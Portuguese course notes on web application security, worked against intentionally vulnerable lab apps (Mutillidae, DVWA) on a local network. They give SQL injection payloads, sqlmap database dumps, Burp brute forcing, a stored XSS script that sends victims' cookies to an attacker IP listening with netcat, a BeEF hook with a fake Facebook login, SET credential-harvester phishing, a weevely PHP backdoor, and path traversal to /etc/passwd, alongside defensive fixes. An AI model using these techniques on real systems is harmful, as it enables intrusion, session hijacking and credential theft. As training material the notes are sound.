# Segurança Web

Link do ova usado pro kalilinux: https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/#1572305786534-030ce714-cc3b (escolha o torrent haha)

Senha kali usuario kali

Link pro servidor com uma porrada de apps ruins: https://drive.google.com/open?id=0BzmYQVmw4W7nSnh6S1QteEpaMTA

Abra o web browser e digite o ip do server quando ativo, provavel de ser: http://192.168.0.102/

Vou tentar colocar tudo no hd externo um dia

Para aumentar o tamanho da tela no kali basta, dentro do sistema operacional, apertar Super(ou windows) escrever display e mudar a resolução

O servidor nos dará um IP e devemos acessar-lo no kali linux, cliclamos na página multilidaeII e  isso nos dará uma série de sites, aí vamos na parte Login/Register e veremos a seguinte página

![Login e senha do site da multilidae no OWASP](img/site1.png)

## SQL injection

Quando colocamos senha e login em um site eu faço uma requisição ao servidor e este conversa com o banco de dados verificar se meu usuário e senha estão certos ou não e para fazer isso ele usa a linguagem SQL, bem e se eu induzir o servidor com a linguagem SQL de modo a conseguir a fazer algo que eu quero?

a primeira coisa é chutar um nome de usuário e senha e para isso nós colocamos

```pas
Usuário: aaaa
Senha: aaa
```

O comentário que a página vai fazer é: conta não existente (em inglês lógico), mas isso é uma vulnerabilidade pois normalmente o que vemos nos sites é o que? Usuário e/ou senha não existentes, então basta acertar o nome de usuário que nosso trabalho fica um pouco melhor.

Como o Owasp é um server feito para que você treine a segurança das suas aplicações então ele nos dá um usuário que é `admin`, então ele nos dá a seguinte mensagem `senha incorreta`.

Agora se colocarmos na senha `'`, somente aspas simples o site me mostra que ocorreu uma exceção, e que:

![Mensagem de erro](\img\excecao.png)

E isso nos dá um comando SQL 

```sql
SELECT username FROM accounts WHERE username='admin' AND password=''';
 ```

E isso é um baita vulnerabilidade do site, sem contar que vemos na imagem que ele usa um servidor do tipo MySQL, então basta enganar o SQL do site de modo a fazer com que minha senha pareça certa para ela. Note que minha senha começa com aspas e termina com aspas simples então um senha válida para caso eu nem tenha uma conta criada seria:

```sh
Senha x' or 'a'='a
```

Senha com espaço e aspas simples mesmo tá?

Onde eu digo ou minha senha é x ou a=a, e como tenho uma lógica ou embutida então a=a está certa,SQL entendido, lógica feita e resultado deu positivo, acesso liberado.

Essa exception acontece por que o SQL processa palavras com aspas simples ' e quando ele tenta ler a password isso nos retorna um erro, erro esse que é informada para a gente e isso abre uma vulnerabilidade para poder atacar.

Agora vamos voltar para a query que o servidor faz com o banco de dados, 

```sql
SELECT username FROM accounts WHERE username='admin' order by 1,2 -- ' AND password=''';
 ```

 Sabemos pelo código que ele nos deu que temos uma coluna de usuários e outra de senhas, mas eu não sei a senha o que devo fazer para excluir o mandar senha? Comento (com --) e injeto somente o código `admin' order by 1,2 -- ` no usuário (com espaços também, no final e no comando order by) e ele nos dá:

 ![Olha lá que legal](\img\adminadmin.png)

 Agora vá na aba 
 
 OWASP 2013 -> A1 - Injection (SQL) -> SQLi Extract Data -> User Info (SQL).

 E aí podemos voltar na tela de login e senha e ver se temos 10 colunas pro SQL me arrumar, e com isso eu digito no usuário

 ```.
admin' order by 10 -- 
 ```

E isso nos dá uma exceção:

```err
error: Unknown column '10' in 'order clause'
```

E aí basta diminuirmos esse número e ver como o programa vai nos respondendo. E com isso verificamos que com 8 já começamos a ter problemas. Então um usuário tem 7 colunas. E com isso podemos entender como que o banco de dados está desenhado para essa aplicação.

Agora quero saber quais são essas colunas de verdade e pra isso eu uso do SQL a information_schema dentro da tabela accounts previamente vista e para isso eu forço o seguinte comando de novo:

```sql
SELECT username FROM accounts WHERE username='admin' UNION SELECT * from information_schema.columns where table_name='accounts' -- ' AND password='';
 ```

Só que aí ele nos dá o seguinte erro:

```err
error: The used SELECT statements have a different number of columns
```

Isso é nós temos que informar o número de colunas que essa tabela tem e que já sabemos que são 7 então basta fazer:

```sql
SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password='';
```

E com isso temos a resposta

![Todas as senhas e usuários](\img\ataque_geral.png)

E para saber qual o banco onde essas colunas (2 para username, 3 para password e 4 para signature) estão basta substituir os numeros correspondentes as informações que quero saber e escrever `database()` da seguinte forma:

```sql
SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,database(),database(),4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password='';
```

O que nos dá:

![Informações de onde estão os dados](\img\database.png)

Agora podemos ver o nome das colunas nessa tabela ao fazer:

```sql
SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,column_name,column_name,4,5,6,7 from information_schema.columns where table_name='accounts' and table_schema='nowasp' -- ' AND password='';
```

E com isso descubro todas as colunas dentro do banco sql

![informações do banco sql](\img\information_schema.png),

E essas são todas as colunas presentes no banco SQL nowasp e dentro da tabela accounts.

O information schema seria um banco de dados interno capaz de referenciar os demais bancos presentes em minha aplicação, podendo informar nomes de colunas e tabelas. Sendo assim muito importante para descobrir que informações estão guardadas.

## SQLMAP

Outra falha de segurança (visto no curso de http) é que o site manda pro server pelo http a senha e usuário pela URL.

![URL](\img\URL.png)

E além do site ter http e não https.

E podemos usar essa vulnerabilidade no terminal do kali pra deixar nossas requests um pouco mais simples com o SQLMAP. para isso no terminal eu escrevo

```sh
sqlmap -u "http://192.168.0.102/mutillidae/index.php?page=user-info.php&username=admin&password=aaa&user-info-php-submit-button=View+Account+Details"
```

E para saber qual a database eu coloco

```sh
sqlmap -u "http://192.168.0.102/mutillidae/index.php?page=user-info.php&username=admin&password=aaa&user-info-php-submit-button=View+Account+Details" --current-db
```

E ele me informa um monte de coisa entre elas `current database: 'nowasp' agora pra saber quais tabelas tem nesse banco de dados eu coloco

```sh
sqlmap -u "http://192.168.0.102/mutillidae/index.php?page=user-info.php&username=admin&password=aaa&user-info-php-submit-button=View+Account+Details" --tables -D nowasp
```

E o resultado é lindo e que é:

```
Database: nowasp
[12 tables]
+----------------------------+
| accounts                   |
| balloon_tips               |
| blogs_table                |
| captured_data              |
| credit_cards               |
| help_texts                 |
| hitlog                     |
| level_1_help_include_files |
| page_help                  |
| page_hints                 |
| pen_test_tools             |
| youtubevideos              |
+----------------------------+
```

E olha que tabela bonita chamada `credit_cards` ali no meio hahahah que beleza.

Então para isso basta fazer

```sh
sqlmap -u "http://192.168.0.102/mutillidae/index.php?page=user-info.php&username=admin&password=aaa&user-info-php-submit-button=View+Account+Details" --dump -T credit_cards -D nowasp

```

E o resultado nos dá:

```sh
Database: nowasp
Table: credit_cards
[5 entries]
+------+-----+------------------+------------+
| ccid | ccv | ccnumber         | expiration |
+------+-----+------------------+------------+
| 1    | 745 | 4444111122223333 | 2012-03-01 |
| 2    | 722 | 7746536337776330 | 2015-04-01 |
| 3    | 461 | 8242325748474749 | 2016-03-01 |
| 4    | 230 | 7725653200487633 | 2017-06-01 |
| 5    | 627 | 1234567812345678 | 2018-11-01 |
+------+-----+------------------+------------+

```

E não se anime hahaha os bancos de dados são protegidos contra esse tipo de injeção a SQL.

Agora verificando a tabela accounts nós temos:

```
Database: nowasp
Table: accounts
[24 entries]
+-----+----------+---------------+----------+-----------+--------------+-----------------------------------------+
| cid | is_admin | lastname      | username | firstname | password     | mysignature                             |
+-----+----------+---------------+----------+-----------+--------------+-----------------------------------------+
| 1   | TRUE     | Administrator | admin    | System    | admin        | g0t r00t?                               |
| 2   | TRUE     | Crenshaw      | adrian   | Adrian    | somepassword | Zombie Films Rock!                      |
| 3   | FALSE    | Pentest       | john     | John      | monkey       | I like the smell of confunk             |
| 4   | FALSE    | Druin         | jeremy   | Jeremy    | password     | d1373 1337 speak                        |
| 5   | FALSE    | Galbraith     | bryce    | Bryce     | password     | I Love SANS                             |
| 6   | FALSE    | WTF           | samurai  | Samurai   | samurai      | Carving fools                           |
| 7   | FALSE    | Rome          | jim      | Jim       | password     | Rome is burning                         |
| 8   | FALSE    | Hill          | bobby    | Bobby     | password     | Hank is my dad                          |
| 9   | FALSE    | Lion          | simba    | Simba     | password     | I am a super-cat                        |
| 10  | FALSE    | Evil          | dreveil  | Dr.       | password     | Preparation H                           |
| 11  | FALSE    | Evil          | scotty   | Scotty    | password     | Scotty do                               |
| 12  | FALSE    | Calipari      | cal      | John      | password     | C-A-T-S Cats Cats Cats                  |
| 13  | FALSE    | Wall          | john     | John      | password     | Do the Duggie!                          |
| 14  | FALSE    | Johnson       | kevin    | Kevin     | 42           | Doug Adams rocks                        |
| 15  | FALSE    | Kennedy       | dave     | Dave      | set          | Bet on S.E.T. FTW                       |
| 16  | FALSE    | Pester        | patches  | Patches   | tortoise     | meow                                    |
| 17  | FALSE    | Paws          | rocky    | Rocky     | stripes      | treats?                                 |
| 18  | FALSE    | Tomes         | tim      | Tim       | lanmaster53  | Because reconnaissance is hard to spell |
| 19  | TRUE     | Baker         | ABaker   | Aaron     | SoSecret     | Muffin tops only                        |
| 20  | FALSE    | Pan           | PPan     | Peter     | NotTelling   | Where is Tinker?                        |
| 21  | FALSE    | Hook          | CHook    | Captain   | JollyRoger   | Gator-hater                             |
| 22  | FALSE    | Jardine       | james    | James     | i<3devs      | Occupation: Researcher                  |
| 23  | FALSE    | Account       | user     | User      | user         | User Account                            |
| 24  | FALSE    | Skoudis       | ed       | Ed        | pentest      | Commandline KungFu anyone?              |
+-----+----------+---------------+----------+-----------+--------------+-----------------------------------------+

```

Isso com o comando

```sh
sqlmap -u "http://192.168.0.102/mutillidae/index.php?page=user-info.php&username=admin&password=aaa&user-info-php-submit-button=View+Account+Details" --dump -T accounts -D nowasp

```

O que fazer pra se prevenir do SQL injection? Transformar o usuário e a senha em string antes de fazer a query, simples assim.

Na linguagem Java, por meio do uso do PreparedStatement conseguimos separar os parâmetros enviados pelo usuário, da query que está indo ao banco. Por exemplo:

```java
String sql=Insert into accounts(username, password) values (?,?);
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, usuario);
stmt.setString(2, senha);
stmt.execute();
```

Através do uso do PreparedStatement, o código SQL é pré-compilado e armazenado em um objeto do tipo PreparedStatement. Esse tipo de prevenção permite que o banco de dados faça a distinção entre código e dado, dessa forma, mesmo que o usuário mal intencionado colocasse or ‘a’=’a na senha, isso seria interpretado como uma String e não como código.

O sqlmap é uma ferramenta que insere de forma automática várias queries nos parâmetros disponíveis na url para tentar descobrir o tipo de banco de dados usado (MySQL, Oracle, Postgres, etc) o banco da aplicação, as tabelas do banco, assim como os dados que estão inseridos em suas tabelas.

O sqlmap é uma ferramenta usada para verificar de forma automática possíveis vulnerabilidades de sql injection que podem existir. Através dessa ferramenta podemos visualizar dados e estruturas de bancos de dados de uma aplicação, caso essa vulnerabilidade exista.

### OWASP

A owasp é uma empresa sem fins lucrativos que está interessada em ter aplicações mais seguras e se digitarmos owasp top 10 2019 nós vemos as vulnerabilidades mais recorrentes (segundo as empresas) e a primeira é a injeção SQL

https://owasp.org/www-project-top-ten/

## Força Bruta

Se você pode tentar usuários e senhas diversas vezes sem nenhuma restrição de tentativas então você pode criar um script que tenta diversas formas de invasão de sistema.

## Burp Suite

Um app que vai realizar esses ataques para a gente de forma automatica, basta mandarmos a requisição de ataque e ele pega a informação quando rolar a autenticação.

Para isso temos que alterar as configurações de rede do browser de modo a linkar com o burp, então eu mudo o network do firefox para proxy para manual proxy configuration e altero o http proxy para 127.0.0.1 (o nosso localhost) e a porta para 8080.

E aí nós colocaremos uma senha qualquer e damos login, com isso o burpe interrompe a conexão e nos mostra o que eles encontraram. (Basta ir no target adicionar a URL da home e verificar se o proxy está habilitado)

Como:

```err
POST /mutillidae/index.php?page=login.php HTTP/1.1

Host: 192.168.0.102

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.0.102/mutillidae/index.php?page=login.php&popUpNotificationCode=LOU1

Content-Type: application/x-www-form-urlencoded

Content-Length: 59

Connection: close

Cookie: showhints=0; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=0r9ik7j9jfttmngsjrkji9rq16

Upgrade-Insecure-Requests: 1



username=admin&password=alura&login-php-submit-button=Login
```

Esse é o intercepcionamento do protocolo http com a página. O burp intercepta esse protocolo e requisita diversos iguais a esse. (a soluçao para isso é justamente o htpps)

ai clica com o botao direto e send to intruder, vai na guia intruder, limpa todos os parametros e podem ser mudados, vai onde está o admin e o username seleciona e clica em add

Ai mude o modo de ataque de sniper (tiro certeiro de um em um) para cluster bomb, vai na guia payloads e em payload options vai adicionando palavras que você acredita que serão usados para as variáveis que você selecionou

E o resultado a gente ve aqui

![Ataque de força bruta para as palavras que selecionamos para senha e usuário](\img\forca_bruta.png)

E vemos que no http codes que 302 é um status de redirecionamento, enquanto 200 é só código de confirmação. Logo o 302 são as senhas e usuários que deram certo.

Mas colocamos várias palavras aleatórias da nossa cabeça e esse é um processo um tanto demorado então será que existe uma forma de termos uma lista com os maiores casos de sucesso? Aí que temos as wordlists e o kali já apresenta listas prontas para que possamos utilizar. E elas podem ser vistas se digitarmos no terminal

```sh
locate /wordlists
```

Ele nos apresenta uma série de endereços com essas palavras.

Uma lista para se ver é:

```sh
/usr/share/dirb/wordlists/common.txt
```

Se digitarmos cat antes desse endereço veremos um monte de palavras que tem nesse arquivo, além de inumeros fóruns com boas listas de palavras possíveis para um ataque de força bruta. E um comando que me monta uma lista personalizada para uma página específica é:

```sh
cewl "http://192.168.0.102/mutillidae/" -d 1
```

Beleza mas como usar essas listas para realizar a força bruta?

Primeiro vamos salvar essa saída em uma arquivo txt como:

```sh
cewl "http://192.168.0.102/mutillidae/" -d 1 -w cewl.txt
```

E com isso basta carregar no burp na guia payloads, aí vai na pasta do /usr/share/dirb/wordlists/ e adiciona o arquivo commom.txt no username e cewl.txt na home e de o ataque com bomb. E são 1 milhão de palavras e isso vai demorar absurdo, mas vai funcionar uma hora.

***Solução***: limitar o número de tentativas e senhas mais poderosas (com letras maiusculas, caracteres especiais, letras maiusculas e minusculas) que servem para dificultar o uso da força bruta.

Voltando na lista top10 de ataques da OWASP vemos que a quebra de autenticação é a segunda principal causa de problemas. Logo atrás das SQL injection

## Cross site scripting

A idéia aqui é injetar códigos java script pra ver o que esse site vai retornar para a gente como resposta. Então se tivermos um site no formato de blog, nós podemos realizar esses ataques.

Então entrando no blog da multilidae (owasp2013/A3 Cross site scripting/persistent/ add to your blog), nós digitamos:

```js
<script>
alert("Para que você saiba que ficou foda mesmo");
</script>
```

E temos essa mensagem:

![alerta recebido](/img/alert.png)
![mensagens](/img/msgs.png)

E se um outro usuário (no caso o windows for acessar o site pelo link http://192.168.0.102/mutillidae/index.php?page=add-to-your-blog.php), ele verá

![](/img/msg-outramaquina.png)

Isso acontece por que o site processa essa informação como sendo uma mensagem válida, e sem transforma-la em string, então sempre que o site for requisitado ele printará a mensagem (que é um script) pro usuário, pois ela já está armazenada no banco de dados.

E o fluxo das informações é a seguinte

![Fluxo do xss](\img\fluxo.png)

Um popup aparecendo no site é o de menos mas por se um java script isso nos abre bastante precedentes para ataques. E por ele estar no banco de dados ele acaba por se torna um XSS persistente. De acordo com a OWASP, os ataques XSS Persistent são aqueles onde os scripts são armazenados permanentemente no back-end. A vítima então recebe esse script ao realizar o acesso a página.

Para voltar as configurações iniciais na database só clicar em reset database.

```js
<script>
document.body.innerHTML="";
</script>
```

Já esse comando deixa toda a página (o body na real) em branco, so mantem o rodapé do site.

E podemos aoriveitar essa brecha para colocar uma imagem do nosso pc ou um vídeo qualquer no site dos caras. (tipo colocar a logo dos Anonymous e talz) com o seguinte código

```js
<script>
  document.body.innerHTML="";
  var imagem=new Image();
  imagem.src="[url da imagem]";
  document.body.appendChild(imagem);
</script>
```

![Você foi hackeado pelos anonemas](/img/anonemas.png)

Porém isso ainda não é muito sério, como que eu acesso os dados de um cliente daquele site?

Sequestrando sua seção. Pois quando você requisita um acesso a um site com login e senha você abre um canal de sessão com o servidor que te manda os cookies de identificação do seu usuário com o servidor, e aí o hacker pega o meu número de sessão e use nele, aí na minha conta ele acessa meus dados.

Primeiro eu vejo se consigo pegar o meu cookie e imprimir na tela com o comando

```js
<script>
alert(document.cookie)
</script>
```

E nos mostra um popup escrito

```cookie
showhints=1; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=8l72tf673mt231e8rg37aanp32
```

Só que não me interessa o meu cookie e sim o da vítima, e para fazer isso eu faço uma requisição do computador da vítima para o computador do hacker e essa requisição entregará o cookie da vítima.

E para isso eu faço o seguinte código

```js
Muito bom o site! (mensagem para não fazer a mensagem ser suspeita)

<script>

  var imagem=new Image();
  imagem.src="http://[ip-da-máquina no caso 192.168.0.104]?"+document.cookie;
  document.body.appendChild(imagem);
</script>
```

E com isso já temos a arapuca armada pro hacker poder acessar o seu cookie e poder se passar por você dentro do site.

Agora falta o hacker ouvir a essa requisição e para isso devemos usar o netcat ou nc e para isso vamos digitar

```sh
sudo nc -lvp 80
```

Isso é pedimos para que o netcat escute (l) e imprima (v) a porta 80 de comunicação. 

Aí na saída do terminal eu tenho o queria

```sh
listening on [any] 80 ...
192.168.0.103: inverse host lookup failed: Unknown host
connect to [192.168.0.104] from (UNKNOWN) [192.168.0.103] 57531
GET /?showhints=1;%20PHPSESSID=00i587nlarmacl0pmbfs3cb430 HTTP/1.1                                         

Host: 192.168.0.104                                       

Connection: keep-alive                                                
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36                                                                               

Accept: image/webp,image/apng,image/*,*/*;q=0.8                                                                                                       
Referer: http://192.168.0.104/                                                                                
Accept-Encoding: gzip, deflate                                                                                
Accept-Language: en-US,en;q=0.9  
```

Isso quando ele acessou o site, então o computador da outra pessoa que acessou acaba mandando o seu cookie para a outra pessoa que ele nem conhece. Com o método GET, agora falta saber utilizar esse nosso cookie e tirar proveito dele.

E com isso eu vou no Burp suite (que utilizamos no teste de força bruta) e pra isso vou ter que alterar o proxy de novo do nosso navegador para o localhost porta 80.

E aí fazemos uma interceptação no site que queremos entrar (onde eu logo no site) e somente substituimos o número do cookie. Voila estamos logados como admin (se você logou como admin em outra página)

Passo a passo

Uma vez que sequestramos a sessão de nossa pobre vítima, vá até o browser de seu computador e clique no botão Login/Register para se logar no sistema como administrador. O usuário e senha são admin e admin.

Posteriormente, vá até o Kali Linux e configure novamente o browser para que a requisição seja passada ao Burp Suite:

Clicar no íconesettings-> Preferences -> Advanced -> Network -> Settings -> Manual Proxy Configuration -> IP: 127.0.0.1 -> Porta: 8080

Abra o Burp Suite, vá até a aba Target->Scope e adicone a url que será interceptada pelo Burp Suite: http:// [ip do servidor]. Posteriormente vá na aba Proxy -> Intercept e pressione o botão Intercept is On, para que fique Intercept is off. Dessa forma, estamos interrompendo a interceptação momentaneamente.

No Kali Linux, vá até a página da mutillidae, clique no botão Login/Register e clique no link Please register here. Faça o registro com seu nome e senha de preferência. Posteriormente, clique novamente no botão Login/Register e faça o login com o usuário e senha que foram criados. Perceba que somos redirecionados para o link: http:// [ip do servidor]/mutillidae/index.php

No Kali Linux, clique no botão Logout e volte ao Burp Suite, iremos realizar a interceptação para que possamos assim usar a sessão que sequestramos. Vá até a aba Proxy ->Intercept e clique no botão Intercept is Off para que fique Intercept is On.

Volte para o browser do hacker e coloque a url http:// [ip do servidor]/mutillidae/index.php e pressione ENTER. O Burp Suite interceptou a requisição.

Vá até o Burp Suite e veja a requisição interceptada. No parâmetro PHPSESSID troque a sessão pelo da vítima (do terminal). Pressione o botão Forward.

Volte ao browser do Kali Linux.Qual o resultado?

![Logado](\img\logged.png)

### Beef

Outra ferramenta legal é o beef, onde ele já te dá o script necessário para realizar o ataque para você, e aí você acessa seu localhost insere senha:beef usuario:beef e verifica o tráfego na página. Quando ele captura ele fica numa guia lá para você.

E com isso ele pode mandar um pretty theft para você pedindo para você logar no facebook e os caralho

No Kali Linux clique no ícone do Beef

beef-kali

Volte ao browser do Kali Linux e desabilite a configuração do Proxy, não usaremos mais o Burp Suite. (Clique nosettings-> Preferences -> Advanced -> Network -> Settings -> No proxy).

Vá até a página da mutillidae que está na url: http:// [ip do servidor]/mutillidae e clique no botão Reset DB para apagar todas as informações dos exercícios anteriores. E posteriormente acesse a página do blog em:

OWASP 2013 -> A3 - Cross Site Scripting (XSS) -> Persistent (Second Order) -> Add to your blog

Coloque o script do Beef na mensagem do blog:

```js
<script src="http://[ip do Kali Linux]:3000/hook.js">
```

Caso o Beef não tenha aberto uma aba no browser, abra uma nova aba e coloque a url: http://127.0.0.1:3000/ui/authentication

Para se autenticar no Beef, coloque usuário e senha beef e beef. Vá até o seu computador, abra o browser e vá até a página do blog, posteriormente volte ao Kali Linux e veja se o Beef capturou a vítima. Na aba esquerda selecione a vítima

beef-vitimas

Posteriormente vá até a aba Commands e digite na aba Search, Pretty Theft. Clique no botão Execute e volte para o browser da vítima.

Veja se o pop-up do Facebook apareceu na janela da vítima.

beef-facebook

Coloque um usuário e senha e volte até o Beef. Qual o resultado?

Obs: Não tente isso com outras pessoas!

### Owasp

No site da owasp de 2017 vemos que Cross-Site Scripting XSS aparece na sétima posição e a forma de evitar isso é fazendo se tem tag aberta na mensagem (isso é se ela aceita html) e se há scripts sendo mandadas na nossa mensagem por causa disso e a owasp recomenda algumas prevenções para serem aplicadas (nesse vale a pena ler como, caso você precise)

De acordo com a OWASP, uma das formas de prevenir o ataque de Cross Site Scripting (XSS) seria de realizar o escaping de elementos HTML prevenindo assim que seja interpretado como um contexto de execução. Por exemplo em Java, a OWASP possui uma biblioteca (ESAPI) que auxilia nessas questões. Poderíamos colocar em nossa programação no back-end:

```js
String encoding=ESAPI.encoder().encodeForJavaScript();
```

Dessa forma, se colocarmos:

`<script>` , através do escaping teremos a conversão desses elementos html para seus respectivos códigos: `&ltscript&gt`

Link de download da ESAPI: https://github.com/ESAPI/esapi-java

## Engenharia Social

Engenharia social é basicamente enganar as pessoas fazendo as acreditar que eles estão acessando um site conhecido como amazon, netflix, youtube com um html todo parecido porém com um link duvidoso via email, sms ou em uma rede social. E assim eles pegam seu email e senha com vc digitando isso para elas.

E aí usamos o setoolkit que pode ser baixado como:

```git
git clone https://github.com/trustedsec/social-engineer-toolkit.git
```

Dependendo da versão do kali que você rode ela já está no sistema operacional

Nele vc tem várias opçoes de engenharia social, como clonamento de sites, envio de email, sms, ataque a sites.

E no site quebrado da wordpress do owasp eu vejo que a url do wp-admin está como

```url
http://192.168.0.102/wordpress/wp-login.php?redirect_to=%2Fwordpress%2Fwp-admin%2F
```

E olhe esse redirect na URL, ele pode me mandar pra qualquer site que eu queira, tal uma página clonada, afinal está no meu domínio wordpress. E com o setoolkit eu consigo ter acesso a todas as senhas e usuários trafegados por ali. passo a passo pra clonar a página

- Selecione a opção Social-Engineering Attacks, digitando 1

- Selecione a opção Website Attack Vectors, digitando 2

- Selecione a opção Credential Harvester Attack Method, digitando 3

- Selecione a opção Site Cloner, digitando 2

- Devemos agora selecionar qual será o endereço IP onde iremos colher as informções da requisição POST. Será o IP do Kali Linux, abra um outro terminal e digite ifconfig e insira seu IP nesse campo

- Abra o browser e digite: http:// [ip do servidor]/wordpress/wp-admin

- Copie o link completo e volte ao terminal onde o setoolkit está rodando. No campo onde está escrito Enter the url to clone, coloque a url copiada no item anterior e pressione ENTER

- Caso o setoolkit pergunte: Apache may be not running, do you want SET to start the process? Digite y

- Abra o browser no Kali Linux e digite http:// [ip do seu Kali Linux que você redirecionou]

E com isso temos a monitoração no terminal e na pasta root. Basta você enviar um email para as vítimas

Só que mandar o email pelo terminal acaba ficando com uma aparência não muito legal e que pode acabar ficando um tanto suspeito e para isso temos o anonymusemail.me . Basta digitar no google e ir. O usuario precisará fazer o login duas vezes para se cadastrar no site, mas basta uma para mandar seu acesso pro hacker.

### Owasp

No site da owasp esses redirecionamentos de link estão em decimo lugar nos casos mais corriqueiros, mas pode ser que seja maior pois o problema não está na empresa e sim no usuario.

Dicas: nao clique em emails mandados pela ''empresa'' isso pode ser um agente malicioso. E a empresa pode não usar mais o redirect pela url e sim força o redirecionamento para uma página dentro do domínio.

## Falha de segurança

Muitas páginas na internet tem uma página própria com URL

```url
https://nomedosite.com.br/admin
```

E qualquer index que o site não quer q se seja indexado ele pode ser visto em /robots.txt, e caso ele precise de uma autenticação para ele ser usado ele terá então uma falha de segurança

Como nos site do responde aí https://www.respondeai.com.br/robots.txt

Existem casos que por questão estratégica e de otimização, não queremos que certas páginas sejam indexadas em mecanismos de buscas. Dessa forma, precisamos informar a esses mecanismos de busca quais são as páginas de nosso site que não queremos que seja indexada e isso é feito através do arquivo robots.txt

E uma coisa que não pode acontecer é isso aqui:

![As senhas de todo mundo com acesso público](/img/passwords.png)

Já que o robots.txt da página nos dava.

```txt
User-agent: *
Disallow: passwords/
Disallow: config.inc
Disallow: classes/
Disallow: javascript/
Disallow: owasp-esapi-php/
Disallow: documentation/
Disallow: phpmyadmin/
Disallow: includes/
```

Existem ferramentas como o Nikto que são capazes de “scanear” um servidor web, listando informações de servidor, como qual tecnologia utilizada, versão, etc e os links referentes a um domínio. Com isso, podemos descobrir páginas que teoricamente não eram para ser indexadas, e se tiver alguma página com conteúdo privado que não esteja com nenhum processo de autenticação, qualquer usuário poderá acessar.

Com um comando chamado nikto eu consigo ver o que eu tenho de informações pública no site para isso eu digito:

```sh
nikto -h http://192.168.0.102/mutillidae/
```

E tenho acesso ha muitas páginas e coisas do tipo e até o tipo do banco de dados. Além de páginas que deveriam estar seguras e não estão. como no caso da multilidae a /phpinfo.php e que nos mostra muitas informações do servidor do site e através dessas informações eu ja posso mapear um pouco o site e trabalhar em códigos que irão burlar o site para nós.

As vezes com upload de arquivo o site acaba mostrando o caminho onde fizemos o upload, esse caminho pode indicar uma vulnerabilidade do sistema, como aceitar um arquivo em php, uma forma de ver no OWASP é pelo Damn Vulnerable aplication e por um backdoor eu crio um programa capaz de ganhar acesso ao servidor do site. No kali esse backdoor pode ser conseguido pelo weevely

Para usar ele eu coloco

```sh
weevely generate 1234 app.php
```

Onde 1234 é a senha de comunicação com esse arquivo que eu crio (que cria na pasta root), e eu espero me comunicar com ele no meu terminal quando ele estiver lá no servidor.

No dvwa ele nos dá o link e para acessar o arquivo eu coloco o seguinte link

http://192.168.0.102/dvwa/hackable/uploads/app.php

E depois eu coloco

```sh
weevely "http://192.168.0.102/dvwa/hackable/uploads/app.php" 1234
```

E ele se conecta com o servidor, tanto que se dermos ls ele nos mostra

```
app.php
dvwa_email.png
www-data@owaspbwa:/owaspbwa/dvwa-git/hackable/uploads
```

E aí conseguimos voltar diretórios até achar um arquivo chamado index.php e com isso conseguir mudar o conteúdo de lá de modo a colocar a foto do anemonas por lá

Um backdoor seria um arquivo no qual é usado para conexão, permitindo assim quando usado de forma correta, que um administrador possa entrar no sistema para realizar reparos de problemas. Quando usado de forma incorreta, o backdoor torna-se uma forma que hackers utilizam para ganhar acesso de forma ilícita.

Uploads de arquivos podem se tornar um problema, vimos em nossa aplicação pelo fato do sistema não verificar o tipo de arquivo, fomos capazes de inserir um backdoor e ganhamos assim acesso ao sistema. Ao filtrar o tipo de arquivo, temos uma segurança maior que o que será passado é apenas o necessário para nossa aplicação, por exemplo, poderíamos colocar em Java:

```php
FileFilter filtro = new FileNameExtensionFilter("jpg", "jpeg");
```

O Weevely seria um simulador de conexões telnet, para acesso remoto de equipamentos. Dessa forma, ele pode ser usado por usuários mal intencionados para ganhar acesso de uma máquina via conexão remota. Quando passamos o caminho do backdoor para o Weevely, ele é capaz de realizar a conexão e assim devemos ter o acesso do servidor. De forma legar o weevely pode ajudar um administrador de sistema a configurar o servidor de forma rápida e descomplicada mas para um agente mal intencionado isso representa uma vulnerabilidade tremenda.

### Owasp

No site da owasp os problemas de desconfiguração da segurança estão atualemte em sexto lugar e para evitar é a restrição do tipo de extensão que pode ser colocada ou não.

## Owasp ZAP

O owasp zap é uma ferramenta que realiza todos os testes de vulnerabilidade citados e mais alguns e nos mostra um relatório de como anda nossa aplicação (bem prático não? hahaha) para isso basta fazer adicionar a URL e rodar o teste, depois só ir na guia alert e ver o nível de segurança da sua aplicação.

O que representa um ganho de tempo nos testes, e que podem ser encontradas vulnerabilidades dificeis de se detectar manualmente.

Um outro software bom é o Nessus

A ferramenta OWASP-ZAP é open source e torna-se muito útil durante a etapa de desenvolvimento, pois com ela, conseguimos verificar de uma forma automatizada possíveis vulnerabilidades que possam existir em nossa aplicação.

### Path transversal

A possibilidade de trafegar entre os diretórios da nossa aplicação de modo a encontrar um arquivo que não deveria encontrar, como o arquivo de senhas de clientes registradas.

OWASP-2013 -> A4 - Source Viewer

Tente realizar manualmente o path traversal para acessar o arquivo passwd.

Lembre-se: O diretório var e o etc estão abaixo do Root, volte diretórios e tente acessar o arquivo passwd.

## Resumo

Vamos retomar, rapidamente, o que aprendemos nesse curso:

- Injection: No primeiro capítulo aprendemos sobre injeção de código SQL, inclusive, fomos capazes de extrair informações do Banco de Dados, mencionamos também problemas de autenticação de força bruta, fizemos downloads de listas e utilizamos o Burb Suite;

- Cross site Scripting: aprendemos sobre esse tipo de ataque e como exercício introduzimos um código javascript e uma imagem do Anonymus em um site, ainda, realizamos o sequestro de sessão para nos logar como usuário admin;

- Conseguimos fazer um redirecionamento de objeto, vimos problemas de configuração ou o que acontece quando acreditamos que não indexar um endereço é proteção o suficiente. Falamos também sobre Upload de arquivos, cuidados sobre quais arquivos um usuário está enviando e informações sobre exposição de dados sensíveis

- Falamos sobre vulnerabilidades existentes nos sistemas quando fizemos o clone da página do WordPress e exploramos também o redirect para enganar a vítima.
